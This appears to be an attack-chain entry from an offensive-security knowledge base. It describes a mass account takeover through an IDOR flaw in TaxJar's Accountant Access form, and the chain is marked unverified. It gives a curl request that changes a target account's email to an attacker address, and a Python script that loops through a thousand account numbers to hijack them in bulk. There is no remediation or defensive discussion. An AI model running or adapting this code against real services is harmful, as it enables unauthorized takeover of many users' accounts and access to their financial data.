---
tags:
  - idor
  - account-takeover
  - web-vuln
type: attack_chain
tools:
  - '[[tools/Python]]'
tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
commands: []
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Discover-IDOR-in-TaxJar-Accountant-Access-Form]]'
  - '[[procedures/Exploit-IDOR-by-Manipulating-Account-Email-Change-Requests]]'
  - '[[procedures/Automate-Mass-Account-Takeover-with-Python-Script]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
description: >-
  Exploiting an IDOR vulnerability in TaxJar's Accountant Access form to change
  account emails and achieve mass takeovers without user interaction
skill_level: intermediate
impact_level: high
id: 59cf691c-5d00-4714-bac2-cb57fb2e17b1
created_at: '2025-12-11T03:47:49.198Z'
updated_at: '2025-12-11T03:47:49.198Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0003]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1078]]'
---
# Mass Account Takeover via IDOR in TaxJar Accountant Access

Multi-stage attack chain demonstrating exploitation of an IDOR vulnerability in TaxJar's Accountant Access form, leading to unauthorized email changes and mass account takeovers.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discover Vulnerability] --> B[Manual Exploitation]
    B --> C[Automated Mass Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Python]]

### Target Environment

- Web platform
- TaxJar app services
- Network access to TaxJar endpoints

### Initial Access Requirements

- Access to TaxJar Accountant Access form
- Ability to intercept and manipulate HTTP requests
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Discover Vulnerability - [[procedures/Discover-IDOR-in-TaxJar-Accountant-Access-Form]]

**Objective**: Identify the IDOR vulnerability in the Accountant Access form by examining the POST endpoint.

**Instructions**: Examine the form and identify the POST endpoint /accounts/<ACCOUNT_NUMBER> that handles email changes. Test manipulation of the account number parameter to confirm unauthorized access.

**Expected Output**: Confirmation that the endpoint allows arbitrary account number changes without authorization checks.

**Success Indicators**:
- Successful identification of the vulnerable endpoint
- Ability to view or alter request parameters

### Step 2: Manual Exploitation - [[procedures/Exploit-IDOR-by-Manipulating-Account-Email-Change-Requests]]

**Objective**: Exploit the IDOR by modifying requests to change the email of a targeted account.

**Instructions**: Use [[commands/curl-post-email-change]] to send a manipulated POST request:

```bash
curl -X POST https://app.taxjar.com/accounts/<TARGET_ACCOUNT_NUMBER> -d 'email=attacker@example.com'
```

Modify the ACCOUNT_NUMBER in the URL and set the email parameter to the attacker's email in the payload.

**Expected Output**: The targeted account's email is changed to the attacker's, enabling account takeover.

**Success Indicators**:
- Email change confirmation in response
- Ability to log in or reset password using the new email

### Step 3: Automated Exploitation - [[procedures/Automate-Mass-Account-Takeover-with-Python-Script]]

**Objective**: Automate the exploitation for mass account takeovers by iterating through account numbers.

**Instructions**: Create and run a Python script using [[commands/python-automate-takeover]] to loop through account numbers and change emails:

```python
import requests

attacker_email = 'attacker@example.com'
for account_num in range(1, 1001):
    url = f'https://app.taxjar.com/accounts/{account_num}'
    payload = {'email': attacker_email}
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print(f'Successfully changed email for account {account_num}')
```

**Expected Output**: Multiple accounts have their emails changed to the attacker's.

**Success Indicators**:
- Script executes without errors
- Logs show successful email changes for multiple accounts

## Attack Chain Summary

### Key Achievements

1. Discovery of IDOR allowing unauthorized email changes
2. Manual takeover of individual accounts
3. Automated mass takeovers enabling control over numerous accounts

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Valid Accounts]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Persistence]]

*Last updated: [TIMESTAMP]*
